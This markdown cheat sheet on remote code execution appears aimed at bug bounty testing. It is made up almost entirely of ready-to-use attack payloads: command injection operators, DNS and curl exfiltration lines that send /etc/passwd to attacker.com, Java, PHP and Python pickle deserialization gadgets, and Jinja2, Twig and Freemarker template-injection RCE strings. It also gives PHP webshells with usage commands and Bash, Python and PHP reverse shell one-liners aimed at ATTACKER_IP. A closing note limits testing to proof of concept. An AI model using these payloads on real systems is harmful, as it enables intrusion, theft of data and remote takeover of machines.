# RCE — Remote Code Execution

**CWE:** CWE-78 (OS Command Injection), CWE-94 (Code Injection)

---

## Entry Points for RCE

```
OS Command Injection    — shell metacharacters in system() calls
Unsafe Deserialization  — Java/PHP/Python object deserialization
File Upload             — Upload .php/.jsp/.aspx webshell
SSTI                    — Template engines evaluate user input as code
Log4Shell (CVE-2021-44228) — JNDI injection in Log4j2
SSRF → Redis/FastCGI   — Protocol-based RCE
eval() injection        — Server-side JS/Python code execution
```

---

## OS Command Injection

```bash
# Injection operators
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id     # Newline
%0d%0a id  # CRLF

# Blind command injection (time-based)
; sleep 5
| sleep 5
$(sleep 5)
& ping -c 5 127.0.0.1

# Out-of-band (blind RCE confirmation)
; curl http://your.interactsh.url
; nslookup your.interactsh.url
$(curl http://your.interactsh.url)

# Exfiltration via DNS
; nslookup $(whoami).attacker.com
; curl http://$(cat /etc/passwd | base64 | tr -d '\n').attacker.com
```

---

## Unsafe Deserialization

```bash
# Java Deserialization
# Tool: ysoserial
java -jar ysoserial.jar CommonsCollections1 "id" | base64

# Test: look for serialized Java objects in cookies/params
# Magic bytes: rO0AB (base64 of 0xACED 0x0005)

# PHP Deserialization
# Look for: unserialize(), __wakeup(), __destruct() with dangerous ops
O:7:"Example":1:{s:3:"cmd";s:2:"id";}

# PHP Object Injection via PHPGGC
phpggc Laravel/RCE5 system id

# Python pickle deserialization
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
```

---

## SSTI (Server-Side Template Injection)

```bash
# Detection polyglot (triggers errors in different engines)
${{<%[%'"}}%\.

# Engine-specific detection
{{7*7}}           # Jinja2 → 49
${7*7}            # Freemarker → 49
<%= 7*7 %>        # ERB → 49
#{7*7}            # Ruby Slim → 49

# Jinja2 RCE
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# Twig RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# tplmap (automated)
python3 tplmap.py -u "https://target.com/render?name=test"
```

---

## Webshell Commands (Post-Upload RCE)

```bash
# PHP
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo shell_exec($_GET['c']); ?>

# Usage
curl "https://target.com/uploads/shell.php?cmd=id"
curl "https://target.com/uploads/shell.php?cmd=cat+/etc/passwd"

# Reverse shell via webshell
cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'
```

---

## Reverse Shell One-Liners

```bash
# Set up listener
nc -lvnp 4444

# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

> **Note for bug bounty:** Establish RCE with `id`, `whoami`, or `hostname` ONLY. Never pivot, escalate, or access data beyond PoC. Document and stop.
